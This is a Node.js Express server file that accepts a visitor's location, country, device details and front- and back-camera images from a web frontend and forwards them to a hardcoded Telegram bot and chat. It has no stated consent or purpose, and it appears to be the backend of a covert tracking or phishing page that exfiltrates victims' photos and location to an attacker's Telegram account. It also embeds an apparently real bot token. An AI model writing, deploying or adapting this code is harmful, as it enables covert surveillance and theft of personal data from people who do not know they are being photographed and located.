const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = " 7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your actual ptoken
const CHAT_ID = "1208908312"; // Replace with your actual chat ID

// Endpoint to handle data sent from frontend
app.post("/send-to-telegram", async (req, res) => {
  const { location, country, device, osVersion, frontCameraImage, backCameraImage } = req.body;

  // Construct the message text
  const messageText = `
    User Information:
    Location: ${location}
    Country: ${country}
    Device: ${device}
    OS Version: ${osVersion}
  `;

  try {
    // Send the text message to Telegram
    await sendMessageToTelegram(messageText);

    // Send the captured images to Telegram
    if (frontCameraImage) {
      await sendImageToTelegram(frontCameraImage, "Front Camera Screenshot");
    }
    if (backCameraImage) {
      await sendImageToTelegram(backCameraImage, "Back Camera Screenshot");
    }

    res.status(200).send("Data sent successfully to Telegram.");
  } catch (error) {
    console.error("Error sending data to Telegram:", error);
    res.status(500).send("Failed to send data to Telegram.");
  }
});

// Function to send a text message to Telegram
async function sendMessageToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description}`);
  }
}

// Function to send an image to Telegram
async function sendImageToTelegram(imageData, caption) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("caption", caption);
  formData.append("photo", Buffer.from(imageData.split(",")[1], "base64"));

  const response = await fetch(
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
    {
      method: "POST",
      body: formData,
    }
  );

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description}`);
  }
}

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});